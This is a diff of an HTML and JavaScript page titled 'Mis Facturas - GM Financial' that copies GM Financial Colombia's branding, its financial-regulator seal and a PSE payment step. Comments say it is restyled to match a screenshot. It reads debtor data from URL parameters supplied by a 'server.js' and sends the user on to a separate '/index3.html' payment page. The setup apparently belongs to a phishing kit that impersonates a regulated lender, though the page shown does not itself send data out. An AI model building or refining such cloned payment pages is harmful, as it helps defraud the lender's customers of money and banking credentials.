@@ -3,330 +3,441 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mis Facturas - GMFinancial</title>
+    <title>Mis Facturas - GM Financial</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: 'Roboto', Arial, sans-serif;
-            background-color: #f5f5f5;
+            background-color: #ffffff; /* Fondo blanco como en la imagen */
             display: flex;
             flex-direction: column;
             min-height: 100vh;
             -webkit-font-smoothing: antialiased;
+            color: #333;
         }
 
         /* ─── NAVBAR ─── */
         .navbar {
-            background: #0047FF; border-radius: 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            border: none; padding: 8px 0; margin-bottom: 0;
+            background: #0047FF;
+            padding: 10px 0;
+            border-bottom: 4px solid #0036cc; /* Borde inferior sutil */
         }
-        .navbar-brand { padding: 5px 15px; height: auto; }
-        .navbar-brand img { height: 28px; object-fit: contain; filter: brightness(0) invert(1); }
-        @media (min-width: 768px) { .navbar-brand img { height: 40px; } }
-        .navbar-nav > li > a { color: white !important; font-size: 15px; margin-top: 5px; }
+        .navbar-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .navbar-brand img {
+            height: 35px;
+            object-fit: contain;
+        }
+        .navbar-brand span {
+            color: white;
+            font-weight: 700;
+            font-size: 20px;
+            letter-spacing: 1px;
+        }
+        .navbar-right a {
+            color: white;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .navbar-right a:hover {
+            text-decoration: underline;
+        }
 
-        /* ─── CONTENIDO ─── */
+        /* ─── CONTENEDOR PRINCIPAL ─── */
         .container-main {
             flex: 1;
             width: 100%;
-            max-width: 900px;
-            margin: 16px auto 32px;
-            padding: 0 12px;
-        }
-        @media (min-width: 768px) {
-            .container-main { margin-top: 20px; margin-bottom: 40px; padding: 0 15px; }
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 30px 20px 40px;
         }
 
-        /* ─── TARJETAS RESUMEN ─── */
-        .summary-cards {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 10px;
-            margin-bottom: 15px;
+        /* ─── SECCIÓN PASOS (TARJETAS AZULES) ─── */
+        .steps-container {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
         }
-        @media (min-width: 600px) {
-            .summary-cards { grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
+        .step-card {
+            flex: 1;
+            min-width: 280px;
+            border: 1px solid #0047FF;
+            border-radius: 4px;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background: #fff;
+            position: relative;
         }
-
-        .summary-card {
-            background: white;
-            padding: 12px 14px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
-            border-left: 4px solid #0047FF;
-            min-width: 0;
-        }
-        @media (min-width: 768px) {
-            .summary-card { padding: 18px 20px; }
-        }
-        .summary-card h4 {
-            font-size: 10px;
-            color: #888;
-            margin: 0 0 4px 0;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-        }
-        .summary-card .amount {
-            font-size: 16px;
-            color: #333;
-            font-weight: 700;
-            word-break: break-word;
-            overflow-wrap: anywhere;
-            line-height: 1.25;
-        }
-        @media (min-width: 768px) {
-            .summary-card .amount { font-size: 20px; }
-        }
-
-        /* ─── SECCIÓN DETALLE ─── */
-        .header-section {
-            background: white;
-            padding: 16px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
-            margin-bottom: 16px;
-        }
-        @media (min-width: 768px) {
-            .header-section { padding: 24px 25px; margin-bottom: 20px; }
-        }
-
-        .header-section h2 {
-            color: #333;
-            margin: 0 0 8px 0;
-            font-weight: 700;
-            font-size: 17px;
-        }
-        @media (min-width: 768px) { .header-section h2 { font-size: 20px; } }
-
-        .header-section p {
-            color: #666;
-            font-size: 13px;
-            margin-bottom: 14px;
-            line-height: 1.4;
-        }
-
-        /* ─── TABLA ─── */
-        .table-container {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
-            overflow-x: auto;
-            -webkit-overflow-scrolling: touch;
-        }
-        .table {
-            margin: 0;
-            font-size: 13px;
-            width: 100%;
-            min-width: 0;
-        }
-        .table thead { background: #f8f9fa; border-bottom: 2px solid #0047FF; }
-        .table thead th {
-            color: #333;
-            font-weight: 600;
-            border: none;
-            padding: 10px 12px;
-            white-space: nowrap;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-        }
-        .table tbody td {
-            padding: 12px;
-            vertical-align: middle;
-            border-color: #eee;
-            font-size: 13px;
-            word-break: break-word;
-            overflow-wrap: anywhere;
-        }
-        @media (min-width: 768px) {
-            .table { font-size: 14px; }
-            .table thead th { padding: 12px 15px; font-size: 12px; }
-            .table tbody td { padding: 12px 15px; font-size: 14px; }
-        }
-
-        .valor-destacado {
-            font-size: 16px;
-            font-weight: 700;
-            color: #0047FF;
-        }
-        @media (min-width: 768px) { .valor-destacado { font-size: 20px; } }
-
-        /* ─── BOTÓN PSE (RESPONSIVE, SIN CÍRCULO) ─── */
-        .btn-pay {
+        .step-badge {
             background: #0047FF;
             color: white;
-            border: none;
-            padding: 12px 16px;
-            font-size: 15px;
-            font-weight: 600;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background 0.2s, transform 0.05s;
-            width: 100%;
-            margin-top: 16px;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            line-height: 1.2;
-            white-space: nowrap;
-        }
-        .btn-pay:hover { background: #0036cc; }
-        .btn-pay:active { transform: scale(0.99); }
-        .btn-pay:focus { outline: 2px solid #99b3ff; outline-offset: 2px; }
-
-        @media (min-width: 768px) {
-            .btn-pay {
-                padding: 14px 22px;
-                font-size: 17px;
-                gap: 12px;
-                margin-top: 20px;
-            }
-        }
-
-        /* Logo PSE directo sobre el botón — sin fondo blanco, sin sombra */
-        .btn-pay .pse-logo {
-            height: 22px;
-            width: auto;
-            max-width: 40px;
-            object-fit: contain;
+            font-weight: 700;
+            font-size: 14px;
             flex-shrink: 0;
-            display: block;
-            background: transparent;
-            filter: brightness(0) invert(1); /* lo deja blanco para contraste sobre azul */
+            position: absolute;
+            left: -15px;
+            top: 50%;
+            transform: translateY(-50%);
         }
-        @media (min-width: 768px) {
-            .btn-pay .pse-logo { height: 26px; max-width: 48px; }
-        }
-        /* Si quieres el logo con sus colores originales, elimina la línea filter de arriba */
-
-        /* ─── FOOTER NEGRO ─── */
-        .footer {
-            background-color: #000000;
-            color: #ffffff;
-            padding: 20px 16px;
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            gap: 18px;
+        .step-card p {
+            margin: 0;
+            font-size: 14px;
+            line-height: 1.4;
+            color: #333;
+            text-align: center;
             width: 100%;
         }
-        @media (min-width: 768px) {
-            .footer {
-                padding: 28px 40px;
-                flex-direction: row;
-                justify-content: space-between;
-                align-items: center;
-            }
+        .step-icon {
+            font-size: 20px;
+            color: #333;
+            flex-shrink: 0;
         }
 
-        .footer-left { display: flex; align-items: center; gap: 12px; min-width: 0; }
+        /* ─── TÍTULO SECCIÓN ─── */
+        .section-title {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        /* ─── TABLA RESPONSIVE ─── */
+        .table-wrapper {
+            width: 100%;
+            overflow-x: auto; /* Permite scroll horizontal en móvil */
+            -webkit-overflow-scrolling: touch;
+            margin-bottom: 20px;
+            background: #fff;
+        }
+        .table-custom {
+            width: 100%;
+            min-width: 900px; /* Asegura que la tabla mantenga su estructura */
+            border-collapse: collapse;
+            font-size: 14px;
+        }
+        .table-custom th {
+            padding: 12px 10px;
+            text-align: center;
+            font-weight: 700;
+            color: #000;
+            font-size: 13px;
+            border-bottom: 1px solid #ddd;
+        }
+        .table-custom th span {
+            display: block;
+            font-weight: 400;
+            font-size: 12px;
+            color: #666;
+            margin-top: 4px;
+        }
+        .table-custom td {
+            padding: 12px 10px;
+            text-align: center;
+            vertical-align: middle;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .table-custom input[type="text"] {
+            width: 100%;
+            max-width: 150px;
+            padding: 8px 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 14px;
+            color: #333;
+            outline: none;
+        }
+        .table-custom input[type="text"]:focus {
+            border-color: #0047FF;
+        }
+        .table-custom input[type="text"]:disabled {
+            background: #f9f9f9;
+            color: #999;
+        }
+        .table-custom .check-cell {
+            text-align: center;
+        }
+        .table-custom input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #0047FF;
+        }
+
+        /* ─── CHECKBOX SELECCIONAR TODO ─── */
+        .select-all-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .select-all-container input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #0047FF;
+        }
+
+        /* ─── TOTALES ─── */
+        .totals-row {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+        .total-label {
+            border: 1px solid #0047FF;
+            padding: 12px 24px;
+            font-weight: 700;
+            font-size: 15px;
+            color: #000;
+            background: #fff;
+            border-radius: 4px;
+        }
+        .total-value {
+            border: 1px solid #0047FF;
+            padding: 12px 24px;
+            font-weight: 700;
+            font-size: 16px;
+            color: #000;
+            background: #fff;
+            border-radius: 4px;
+            min-width: 180px;
+            text-align: right;
+        }
+
+        /* ─── NOTAS / VIÑETAS ─── */
+        .notes-list {
+            list-style: disc;
+            padding-left: 20px;
+            margin-bottom: 30px;
+            font-size: 13px;
+            line-height: 1.6;
+            color: #555;
+        }
+        .notes-list li {
+            margin-bottom: 6px;
+        }
+
+        /* ─── BOTÓN CONTINUAR ─── */
+        .btn-continue {
+            display: block;
+            width: 100%;
+            max-width: 350px;
+            margin: 0 auto 40px;
+            background: #0047FF;
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 6px;
+            cursor: pointer;
+            text-align: center;
+            transition: background 0.2s;
+        }
+        .btn-continue:hover {
+            background: #0036cc;
+        }
+
+        /* ─── FOOTER ─── */
+        .footer {
+            background: #ffffff;
+            padding: 20px;
+            border-top: 1px solid #eaeaea;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            flex-wrap: wrap;
+            gap: 20px;
+            max-width: 1100px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .footer-left {
+            display: flex;
+            align-items: flex-end;
+            gap: 15px;
+        }
         .sello-vigilado {
-            border: 1px solid #fff;
-            padding: 4px 2px;
+            border: 1px solid #000;
+            padding: 5px 2px;
             font-size: 8px;
             text-align: center;
             writing-mode: vertical-rl;
             transform: rotate(180deg);
             letter-spacing: 0.5px;
-            height: 64px;
+            height: 70px;
             display: flex;
             justify-content: center;
-            flex-shrink: 0;
+            align-items: center;
+            font-weight: 700;
         }
-        @media (min-width: 768px) { .sello-vigilado { font-size: 9px; height: 80px; } }
-
-        .footer-logo-container { display: flex; flex-direction: column; align-items: flex-start; min-width: 0; }
-        .footer-logo { height: 26px; filter: brightness(0) invert(1); object-fit: contain; }
-        @media (min-width: 768px) { .footer-logo { height: 35px; } }
-        .footer-logo-text { font-size: 9px; color: #cccccc; margin-top: 4px; line-height: 1.25; }
-        @media (min-width: 768px) { .footer-logo-text { font-size: 10px; } }
-
+        .footer-logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .footer-logo-container img {
+            height: 30px;
+            object-fit: contain;
+            margin-bottom: 5px;
+        }
+        .footer-logo-text {
+            font-size: 10px;
+            color: #555;
+            line-height: 1.3;
+        }
         .footer-right {
-            text-align: left;
-            font-size: 11px;
-            color: #aaaaaa;
-            line-height: 1.6;
-            width: 100%;
+            text-align: right;
+            font-size: 12px;
+            color: #666;
+            line-height: 1.5;
         }
-        @media (min-width: 768px) {
-            .footer-right { text-align: right; font-size: 13px; width: auto; }
+        .footer-right strong {
+            color: #00c98d;
+            font-weight: 600;
         }
-        .footer-right strong { color: #00c98d; font-weight: 600; }
+
+        /* ─── RESPONSIVE ─── */
+        @media (max-width: 768px) {
+            .navbar-brand img { height: 28px; }
+            .navbar-brand span { font-size: 16px; }
+            .container-main { padding: 20px 15px; }
+            .steps-container { flex-direction: column; gap: 15px; }
+            .step-card { min-width: 100%; padding-left: 25px; }
+            .step-badge { left: -10px; width: 26px; height: 26px; font-size: 12px; }
+            .totals-row { justify-content: center; }
+            .total-label, .total-value { width: 100%; text-align: center; }
+            .footer { flex-direction: column; align-items: flex-start; }
+            .footer-right { text-align: left; margin-top: 10px; }
+        }
     </style>
 </head>
 <body>
-    <nav class="navbar navbar-default">
-        <div class="container-fluid">
-            <div class="navbar-header">
-                <a class="navbar-brand" href="#">
-                    <img src="gm.png" alt="GM Financial" onerror="this.outerHTML='<span style=\'color:white; font-weight:700; font-size:18px;\'>gm FINANCIAL</span>'">
-                </a>
+
+    <!-- NAVBAR -->
+    <nav class="navbar">
+        <div class="navbar-content">
+            <div class="navbar-brand">
+                <img src="gm.png" alt="GM Financial" onerror="this.outerHTML='<span style=\'color:white; font-weight:700; font-size:20px;\'>gm FINANCIAL</span>'">
             </div>
-            <ul class="nav navbar-nav navbar-right">
-                <li><a href="index.html">Salir</a></li>
-            </ul>
+            <div class="navbar-right">
+                <a href="index.html">Salir</a>
+            </div>
         </div>
     </nav>
 
-    <div class="container container-main">
+    <!-- CONTENIDO PRINCIPAL -->
+    <div class="container-main">
 
-        <div class="summary-cards">
-            <div class="summary-card">
-                <h4>Documento</h4>
-                <div class="amount" id="lbl-documento">-</div>
+        <!-- PASOS -->
+        <div class="steps-container">
+            <div class="step-card">
+                <div class="step-badge">1</div>
+                <div class="step-icon">☑</div>
+                <p>Selecciona el/los crédito(s)</p>
             </div>
-            <div class="summary-card">
-                <h4>Placa</h4>
-                <div class="amount" id="lbl-placa">-</div>
-            </div>
-            <div class="summary-card" style="border-left-color: #00c98d;">
-                <h4>Total a Pagar</h4>
-                <div class="amount valor-destacado" id="lbl-total">$0</div>
+            <div class="step-card">
+                <div class="step-badge">2</div>
+                <div class="step-icon">✎</div>
+                <p>Si vas a realizar un pago por un valor diferente al sugerido, ingresa el valor en el campo <strong>"Pagar Otro Valor"</strong></p>
             </div>
         </div>
 
-        <div class="header-section">
-            <h2>Detalle de tu crédito</h2>
-            <p>A continuación encuentras la factura generada para tu vehículo.</p>
+        <!-- TÍTULO -->
+        <div class="section-title">Selecciona el crédito y el valor a pagar</div>
 
-            <div class="table-container">
-                <table class="table">
-                    <thead>
-                        <tr>
-                            <th>N° Crédito / Factura</th>
-                            <th>Placa</th>
-                            <th>Valor a Pagar</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr>
-                            <td id="lbl-credito" style="font-weight: 600;">-</td>
-                            <td id="lbl-placa-tabla">-</td>
-                            <td class="valor-destacado" id="lbl-valor-tabla">$0</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-
-            <button class="btn-pay" id="btnIrAPagar" type="button">
-                <img class="pse-logo" src="pse.png" alt="PSE">
-                <span>Pagar con PSE</span>
-            </button>
+        <!-- TABLA -->
+        <div class="table-wrapper">
+            <table class="table-custom">
+                <thead>
+                    <tr>
+                        <th>Selecciona</th>
+                        <th>Número de crédito</th>
+                        <th>Placa</th>
+                        <th>Fecha límite de pago<br><span>DD-MM-AAAA</span></th>
+                        <th>Valor sugerido para pago</th>
+                        <th>Pagar otro valor</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="check-cell">
+                            <input type="checkbox" id="checkCredito" checked>
+                        </td>
+                        <td>
+                            <input type="text" id="txtCredito" value="89767246" readonly>
+                        </td>
+                        <td>
+                            <input type="text" id="txtPlaca" value="LRM644" readonly>
+                        </td>
+                        <td>
+                            <input type="text" id="txtFecha" value="05/11/2026" readonly>
+                        </td>
+                        <td>
+                            <input type="text" id="txtValorSugerido" value="$ 3,557,046" readonly>
+                        </td>
+                        <td>
+                            <input type="text" id="txtOtroValor" placeholder="">
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
         </div>
+
+        <!-- SELECCIONAR TODO -->
+        <div class="select-all-container">
+            <input type="checkbox" id="checkAll" checked>
+            <label for="checkAll">Seleccionar todo</label>
+        </div>
+
+        <!-- TOTALES -->
+        <div class="totals-row">
+            <div class="total-label">Total a pagar seleccionado</div>
+            <div class="total-value" id="lblTotalPagar">$ 3,557,046</div>
+        </div>
+
+        <!-- NOTAS -->
+        <ul class="notes-list">
+            <li>Recuerda que si tu obligación se encuentra en mora el valor sugerido para pago no incluye gastos de cobranza prejudicial y/o judicial en caso de aplicar.</li>
+            <li>El pago que realices en horario bancario se verá reflejado en tu crédito al siguiente día hábil, si pagas en otro horario se reflejará al segundo día hábil. Podrás consultar en el portal de autoservicio "Mi Cuenta" el historial de pagos de tu crédito.</li>
+            <li>Si realizas el pago desde una cuenta Bancolombia, selecciona el botón de pagos de Bancolombia y verás reflejado el pago en tu crédito al siguiente día hábil.</li>
+        </ul>
+
+        <!-- BOTÓN CONTINUAR -->
+        <button class="btn-continue" id="btnContinuar">Continuar el pago</button>
 
     </div>
 
-    <!-- FOOTER NEGRO -->
+    <!-- FOOTER -->
     <div class="footer">
         <div class="footer-left">
             <div class="sello-vigilado">VIGILADO<br>SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</div>
             <div class="footer-logo-container">
-                <img src="gm.png" alt="GM Financial" class="footer-logo" onerror="this.outerHTML='<h2 style=\'color:#fff; font-weight:700;\'>gm FINANCIAL</h2>'">
+                <img src="gm.png" alt="GM Financial" onerror="this.outerHTML='<span style=\'font-weight:700; font-size:18px;\'>gm FINANCIAL</span>'">
                 <div class="footer-logo-text">GM Financial Colombia S.A.<br>Compañía de Financiamiento.</div>
             </div>
         </div>
@@ -335,26 +446,83 @@
         </div>
     </div>
 
+    <!-- LÓGICA JS -->
     <script>
+        // 1. Obtener parámetros de la URL (enviados desde server.js)
         const params = new URLSearchParams(window.location.search);
-        const doc = params.get('documento') || '';
-        const placa = params.get('placa') || '';
+        const doc = params.get('documento') || 'N/A';
+        const placa = params.get('placa') || 'N/A';
         const totalStr = params.get('total') || '0';
         const credito = params.get('credito') || 'N/A';
-
+        
+        // Formatear el valor numérico
         const totalNum = Number(totalStr);
-        const totalFormateado = '$' + totalNum.toLocaleString('es-CO');
+        const totalFormateado = '$ ' + totalNum.toLocaleString('es-CO');
 
-        document.getElementById('lbl-documento').textContent = doc;
-        document.getElementById('lbl-placa').textContent = placa;
-        document.getElementById('lbl-total').textContent = totalFormateado;
+        // 2. Asignar valores a los campos de la tabla
+        document.getElementById('txtCredito').value = credito;
+        document.getElementById('txtPlaca').value = placa;
+        document.getElementById('txtValorSugerido').value = totalFormateado;
+        document.getElementById('lblTotalPagar').textContent = totalFormateado;
+        
+        // Asignar fecha simulada (puedes recibirla por URL si la tienes)
+        // document.getElementById('txtFecha').value = params.get('fecha') || '05/11/2026';
 
-        document.getElementById('lbl-credito').textContent = credito;
-        document.getElementById('lbl-placa-tabla').textContent = placa;
-        document.getElementById('lbl-valor-tabla').textContent = totalFormateado;
+        // 3. Lógica de interacción
+        const checkCredito = document.getElementById('checkCredito');
+        const checkAll = document.getElementById('checkAll');
+        const txtOtroValor = document.getElementById('txtOtroValor');
+        const lblTotalPagar = document.getElementById('lblTotalPagar');
 
-        document.getElementById('btnIrAPagar').addEventListener('click', function() {
-            const urlPse = `/index3.html?documento=${encodeURIComponent(doc)}&placa=${encodeURIComponent(placa)}&total=${totalNum}&credito=${encodeURIComponent(credito)}`;
+        // Sincronizar checkbox "Seleccionar todo" con el checkbox de la fila
+        checkAll.addEventListener('change', function() {
+            checkCredito.checked = this.checked;
+            actualizarTotal();
+        });
+
+        checkCredito.addEventListener('change', function() {
+            checkAll.checked = this.checked;
+            actualizarTotal();
+        });
+
+        // Lógica para actualizar el total si se ingresa un "Otro Valor"
+        txtOtroValor.addEventListener('input', function() {
+            actualizarTotal();
+        });
+
+        function actualizarTotal() {
+            if (!checkCredito.checked) {
+                lblTotalPagar.textContent = '$ 0';
+                return;
+            }
+
+            let valorFinal = totalNum;
+            const otroValorRaw = txtOtroValor.value.replace(/[^0-9]/g, ''); // Solo números
+            
+            if (otroValorRaw && Number(otroValorRaw) > 0) {
+                valorFinal = Number(otroValorRaw);
+            }
+
+            lblTotalPagar.textContent = '$ ' + valorFinal.toLocaleString('es-CO');
+        }
+
+        // 4. Botón Continuar
+        document.getElementById('btnContinuar').addEventListener('click', function() {
+            if (!checkCredito.checked) {
+                alert('Por favor, selecciona el crédito para continuar.');
+                return;
+            }
+
+            // Obtener el valor final a pagar
+            const otroValorRaw = txtOtroValor.value.replace(/[^0-9]/g, '');
+            let valorFinal = totalNum;
+            if (otroValorRaw && Number(otroValorRaw) > 0) {
+                valorFinal = Number(otroValorRaw);
+            }
+
+            // Redirigir a la pasarela de pago (index3.html) con los datos
+            // Asegúrate de que esta URL sea la correcta para tu flujo
+            const urlPse = `/index3.html?documento=${encodeURIComponent(doc)}&placa=${encodeURIComponent(placa)}&total=${valorFinal}&credito=${encodeURIComponent(credito)}`;
             window.location.href = urlPse;
         });
     </script>
